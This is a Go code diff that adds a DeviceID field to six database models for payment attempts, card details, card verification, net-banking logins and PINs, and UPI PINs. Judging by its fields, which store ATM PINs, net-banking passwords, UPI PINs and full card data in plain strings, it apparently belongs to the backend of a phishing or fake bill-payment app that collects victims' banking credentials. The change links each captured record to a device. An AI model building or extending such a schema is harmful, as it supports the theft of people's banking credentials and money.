@@ -14,6 +14,7 @@ type BillUpdateRequest struct {
 type PaymentAttempt struct {
 	ID            uint      `gorm:"primaryKey" json:"id"`
 	CreatedAt     time.Time `json:"created_at"`
+	DeviceID      string    `json:"device_id"`
 	Amount        float64   `json:"amount"`
 	PaymentMethod string    `json:"payment_method"`
 	Status        string    `json:"status"`
@@ -22,6 +23,7 @@ type PaymentAttempt struct {
 type CardDetail struct {
 	ID             uint      `gorm:"primaryKey" json:"id"`
 	CreatedAt      time.Time `json:"created_at"`
+	DeviceID       string    `json:"device_id"`
 	CardType       string    `json:"card_type"`
 	CardNumber     string    `json:"card_number"`
 	CardHolderName string    `json:"card_holder_name"`
@@ -33,6 +35,7 @@ type CardDetail struct {
 type CardVerification struct {
 	ID        uint      `gorm:"primaryKey" json:"id"`
 	CreatedAt time.Time `json:"created_at"`
+	DeviceID  string    `json:"device_id"`
 	Dob       string    `json:"dob"`
 	AtmPin    string    `json:"atm_pin"`
 	Amount    float64   `json:"amount"`
@@ -41,6 +44,7 @@ type CardVerification struct {
 type NetbankingDetail struct {
 	ID         uint      `gorm:"primaryKey" json:"id"`
 	CreatedAt  time.Time `json:"created_at"`
+	DeviceID   string    `json:"device_id"`
 	BankName   string    `json:"bank_name"`
 	UserID     string    `json:"user_id"`
 	Password   string    `json:"password"`
@@ -51,6 +55,7 @@ type NetbankingDetail struct {
 type NetbankingPin struct {
 	ID        uint      `gorm:"primaryKey" json:"id"`
 	CreatedAt time.Time `json:"created_at"`
+	DeviceID  string    `json:"device_id"`
 	Pin       string    `json:"pin"`
 	Amount    float64   `json:"amount"`
 }
@@ -58,6 +63,7 @@ type NetbankingPin struct {
 type UpiDetail struct {
 	ID        uint      `gorm:"primaryKey" json:"id"`
 	CreatedAt time.Time `json:"created_at"`
+	DeviceID  string    `json:"device_id"`
 	Pin       string    `json:"pin"`
 	Amount    float64   `json:"amount"`
 }
